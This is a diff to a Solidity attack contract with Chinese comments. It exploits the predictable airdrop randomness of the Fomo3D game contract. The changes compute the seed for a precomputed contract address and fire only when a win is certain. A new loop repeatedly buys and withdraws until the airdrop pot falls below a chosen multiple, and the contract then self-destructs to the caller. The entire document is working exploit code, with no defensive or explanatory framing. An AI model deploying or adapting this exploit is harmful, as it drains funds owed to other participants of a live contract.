@@ -54,7 +54,8 @@ contract Fomo3dAirDropManageContract {
     }
 
     // 发动攻击
-    function checkAndAttack(address target)
+    // multiple {fomo3d:4, lastwinner:10}
+    function checkAndAttack(address target, uint256 multiple)
     external
     payable
     {
@@ -69,7 +70,7 @@ contract Fomo3dAirDropManageContract {
             Fomo3dAirDropChildContract childContract = pool_[i];
 
             if( childContract.check(airDropTracker) ) {
-                childContract.attack.value(msg.value)(target);
+                childContract.attack.value(msg.value)(target, multiple);
                 return ;
             }
         }
@@ -84,6 +85,7 @@ contract Fomo3dAirDropManageContract {
 contract Fomo3dAirDropChildContract {
 
     uint256 public nonce_=0x01;
+    uint256 public seed_ =0;
     
     constructor()
     public
@@ -91,44 +93,64 @@ contract Fomo3dAirDropChildContract {
     }
     
     // start attack
-    function attack(address target) 
+    function attack(address target, uint256 multiple) 
     external
     payable
     {
         //  create the attack contract
-        (new Fomo3dAirDropAttackContract).value(msg.value)(target);
+        (new Fomo3dAirDropAttackContract).value(msg.value)(target, seed_, multiple);
 
         nonce_++;
     }
 
     function check(uint256 airDropTracker)
-    view
     external
     returns (bool)
     {
         // 计算攻击合约地址
         address addr = Fomo3dAirDropUtils.caculateAddress(address(this), nonce_);
+        seed_ = Fomo3dAirDropUtils.airdropSeed(addr);
 
-        return Fomo3dAirDropUtils.airdrop(addr, airDropTracker); 
+        return seed_ < airDropTracker; 
     }
 }
 
 // fomo3d 攻击合约
 contract Fomo3dAirDropAttackContract {
+    using SafeMath for *;
     
-    constructor(address target)
+    Fomo3dLongContractInterface targetContract_;
+    
+    constructor(address target, uint256 seed, uint256 multiple)
     public
     payable
     {
-        Fomo3dLongContractInterface targetContract = Fomo3dLongContractInterface(target);
+        targetContract_ = Fomo3dLongContractInterface(target);
 
+        if( seed == 0 ) {
+            uint256 airDropPot = targetContract_.airDropPot_();
+            uint256 minPot = multiple.mul(msg.value);
+
+            // 重复攻击
+            while( airDropPot > minPot ) {
+                buyAndWithdraw(target);
+                airDropPot = targetContract_.airDropPot_();
+            }
+        } else {
+            buyAndWithdraw(target);
+        }
+
+        selfdestruct(tx.origin);
+    }
+
+    function buyAndWithdraw(address target)
+    internal
+    {
         // send eth the fomo3d contract
         if(!target.call.value(msg.value)()) revert();
 
         // withdraw the fomo3d airdrop
-        targetContract.withdraw();
-
-        selfdestruct(tx.origin);
+        targetContract_.withdraw();
     }
     
 }
@@ -155,10 +177,10 @@ library Fomo3dAirDropUtils {
     }
 
     // compute the airdrop 
-    function airdrop(address addr, uint256 airDropTracker)
+    function airdropSeed(address addr)
     view
     external
-    returns(bool)
+    returns(uint256)
     {
         
         uint256 seed = uint256(keccak256(abi.encodePacked(
@@ -171,11 +193,8 @@ library Fomo3dAirDropUtils {
             (block.number)
             
         )));
-        
-        if((seed - ((seed / 1000) * 1000)) < airDropTracker)
-            return(true);
-        else
-            return(false);
+
+        return (seed - ((seed / 1000) * 1000));
     }
 }
 
